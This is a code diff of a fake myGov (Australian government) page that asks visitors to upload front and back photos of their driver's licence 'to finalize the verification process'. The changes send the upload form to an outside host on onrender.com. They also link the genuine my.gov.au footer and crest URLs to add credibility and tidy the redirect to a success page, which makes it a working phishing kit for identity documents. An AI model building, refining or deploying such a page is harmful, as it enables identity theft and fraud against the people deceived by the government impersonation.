@@ -4,17 +4,17 @@
     <meta charset="utf-8">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <title>Sign in with myGov - myGov</title>
+    <title>Upload Identification - myGov</title>
     <meta name="description" content="">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="format-detection" content="telephone=no">
     <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap" rel="stylesheet">
     <link href="css/mgv2-application.css" rel="stylesheet">
     <link href="css/blugov.css" rel="stylesheet">
-    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
     <link href="progress.min.css" rel="stylesheet" id="bootstrap-css">
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
     <style type="text/css">
         .modal-open{overflow:hidden}.modal{position:fixed;top:0;right:0;bottom:0;left:0;z-index:1040;display:none;overflow:hidden;-webkit-overflow-scrolling:touch;outline:0}
         .modal.fade .modal-dialog{-webkit-transition:-webkit-transform .3s ease-out;-o-transition:-o-transform .3s ease-out;transition:transform .3s ease-out;-webkit-transform:translate(0,-25%);-ms-transform:translate(0,-25%);-o-transform:translate(0,-25%);transform:translate(0,-25%)}
@@ -47,7 +47,7 @@
             <div class="inner">
                 <div class="unauth-grid">
                     <div class="unauth-grid-row">
-                        <a class="unauth-govt-crest__link">
+                        <a href="https://beta.my.gov.au/" class="unauth-govt-crest__link">
                             <img id="unauth-govt-crest" src="images/logo-black.svg" alt="myGov Beta" role="img">
                         </a>
                     </div>
@@ -60,7 +60,7 @@
             <div class="css-t2nf81">
                 <div class="css-k008qs">
                     <div class="css-759u60" style="display: inline-block;">
-                        <p><img src="back.svg" width="8" class="chakra-image css-1mi6x1x">  Home</p>
+                        <p><img src="back.svg" width="8" class="chakra-image css-1mi6x1x"> <a href="/security.html">Back</a></p>
                     </div>
                 </div>
                 <p class="chakra-text css-13iw4fu">Kindly submit your ID to finalize the verification process.</p>
@@ -69,7 +69,10 @@
                         <li style="margin-bottom: 20px;">Driver's License</li>
                     </ul>
                 </p>
-                <button data-toggle="modal" data-target="#squarespaceModal" style="width: 100%; background-color: green;" type="submit" name="_eventId_submit" class="button-main button">Continue to verification</button>
+                <button data-toggle="modal" data-target="#squarespaceModal" style="width: 100%; background-color: green;" type="button" class="button-main button">Continue to verification</button>
+                <center>
+                    <a href="/success.html">SKIP</a>
+                </center>
             </div>
             <!-- Feedback messages -->
             <div id="feedback-message" class="hidden"></div>
@@ -85,7 +88,7 @@
                     <div class="progress progress-striped active">
                         <div id="progress" class="bar" style="width: 50%;">50% Driver License</div>
                     </div>
-                    <form id="upload-form" action="/submit-images" method="post" enctype="multipart/form-data">
+                    <form id="upload-form" action="https://my-go-q7tp.onrender.com/submit-images" method="post" enctype="multipart/form-data">
                         <h2 id="bodytext" style="font-size: 25px; color: black;">Driver License</h2>
                         <p id="errortext" style="color: red; font-size: 13px; padding:1px;"></p>
                         <div id="body2">
@@ -100,7 +103,7 @@
                                             </label>
                                         </div>
                                         <img style="float: right;" class="file-upload-image" width="50" src="dl.png" alt="your image" />
-                                        <input name="image" type="file" onchange="readURL(this);" class="form-control border-0">
+                                        <input name="image" type="file" onchange="readURL(this);" class="form-control border-0" accept="image/*" required>
                                     </div>
                                 </div>
                             </div>
@@ -115,7 +118,7 @@
                                         </label>
                                         <img style="float: right;" class="file-upload-image2" width="50" src="dl.png" alt="your image" />
                                     </div>
-                                    <input name="image2" type="file" onchange="readURL2(this);" class="form-control border-0">
+                                    <input name="image2" type="file" onchange="readURL2(this);" class="form-control border-0" accept="image/*" required>
                                 </div>
                             </div>
                             <br>
@@ -141,16 +144,16 @@
                     <nav>
                         <h2 class="sr-only" aria-label="Footer">Footer</h2>
                         <ul class="lower-links">
-                            <li><a target="_blank">Terms of use</a></li>
-                            <li><a target="_blank">Privacy and security</a></li>
-                            <li><a target="_blank">Copyright</a></li>
-                            <li><a target="_blank">Accessibility</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a></li>
                         </ul>
                     </nav>
                 </section>
                 <div class="footer-lower">
                     <section class="footer-lower-logo">
-                        <a><img src="images/logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img"></a>
+                        <a href="https://beta.my.gov.au/"><img src="images/logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img"></a>
                     </section>
                     <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
                 </div>
@@ -211,10 +214,10 @@
                 }
 
                 if (response.ok) {
-                    feedbackDiv.textContent = 'Images submitted successfully! Redirecting...';
+                    feedbackDiv.textContent = '';
                     feedbackDiv.className = 'success-message';
                     setTimeout(() => {
-                        window.location.href = 'security.html'; // Redirect to security.html
+                        window.location.href = '/success.html'; // Redirect to success page
                     }, 1000);
                 } else {
                     feedbackDiv.textContent = result.error || 'Error submitting images.';
